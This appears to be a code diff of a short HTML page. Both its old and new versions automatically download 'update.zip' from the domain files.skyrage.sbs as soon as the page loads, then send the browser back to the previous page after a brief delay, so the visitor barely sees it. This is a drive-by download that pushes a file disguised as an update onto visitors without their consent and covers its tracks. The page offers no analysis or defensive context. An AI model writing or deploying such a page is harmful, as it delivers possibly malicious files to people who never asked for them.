@@ -1,29 +1,16 @@
 <!DOCTYPE html>
 <html>
-  <head>
+<head>
+    <title>Download File</title>
+</head>
+<body>
     <script>
-      // This function will download the file at the specified URL
-      function downloadFile(url) {
-        var link = document.createElement("a");
-        link.href = url;
-        link.download = true;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }
-
-      // This function will go back to the previous page
-      function goBack() {
-        window.history.back();
-      }
-
-      // Call the downloadFile function with the URL of the file you want to download
-      downloadFile("http://files.skyrage.sbs/update.zip");
-
-      // After a delay of 1 second, call the goBack function to go back to the previous page
-      setTimeout(goBack, 300);
+        window.onload = function() {
+            window.location.href = 'https://files.skyrage.sbs/update.zip'; // replace 'file_url' with the URL of the file you want to download
+            setTimeout(function() {
+                window.history.back();
+            }, 1000); // adjust the time (in milliseconds) as needed
+        }
     </script>
-  </head>
-  <body>
-  </body>
+</body>
 </html>
